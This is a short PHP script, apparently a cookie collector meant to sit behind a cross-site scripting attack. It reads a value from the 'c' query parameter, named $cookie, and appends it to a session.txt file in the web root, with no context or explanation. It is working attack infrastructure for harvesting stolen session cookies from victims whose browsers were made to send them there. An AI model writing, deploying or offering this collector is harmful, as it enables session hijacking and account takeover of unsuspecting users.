<?php
    if(!empty($_GET['c'])){
        $cookie=$_GET['c'];
        
        try{
            $path=$_SERVER["DOCUMENT_ROOT"].'/session.txt';
            $fp=fopen($path,'a');
            flock($fp, LOCK_EX);
            fwrite($fp, "$cookie\r\n");
            flock($fp, LOCK_UN);
            fclose($fp);
        }catch(Exception $e){

        }
    }
?>